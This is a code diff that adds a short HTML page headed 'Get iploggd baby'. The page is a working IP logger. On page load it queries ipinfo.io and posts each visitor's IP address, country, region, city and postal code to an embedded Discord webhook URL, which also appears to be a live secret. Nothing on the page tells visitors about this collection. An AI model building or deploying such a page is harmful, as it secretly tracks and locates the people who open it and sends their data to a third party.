@@ -1,0 +1,50 @@
+<html>
+    <head>
+        <title>seff // luv</title>
+    </head>
+
+    <body>
+        <h1>Get iploggd baby</h1>
+          
+          <svg>
+            <filter id='noiseFilter'>
+              <feTurbulence 
+                type='fractalNoise' 
+                baseFrequency='0.6' 
+                stitchTiles='stitch'/>
+               <feColorMatrix in="colorNoise" type="matrix" values="1 0 0 0 0 0 1 0 0 0 0 0 1 0 0 0 0 0 1 0" />
+                  <feComposite operator="in" in2="SourceGraphic" result="monoNoise"/>
+                  <feBlend in="SourceGraphic" in2="monoNoise" mode="screen" />
+            </filter>
+            
+          </svg>     
+
+          <script>
+            function monke(json) 
+            {
+                 var request = new XMLHttpRequest();
+                 
+                 request.open("POST", "https://discordapp.com/api/webhooks/1131012412091420682/NhRJH7cH2PPT-OmpE7zOLawWHluGu8sLALmiUg0RCaf0muWoVS2CmL9YQGpSOcHIqnYR");
+            
+                 request.setRequestHeader('Content-type', 'application/json');
+            
+                 var params = 
+                 {
+                      username: "IP Logger",
+                      avatar_url: "",
+                      content: "@everyone",
+                      embeds: [
+                           {
+                                title: "Someone visited the IP grabber!",
+                                color: 1752220,
+                                description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                           }
+                      ]
+                 }
+            
+                 request.send(JSON.stringify(params));
+            }
+            </script>
+            <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+    </body>
+</html>
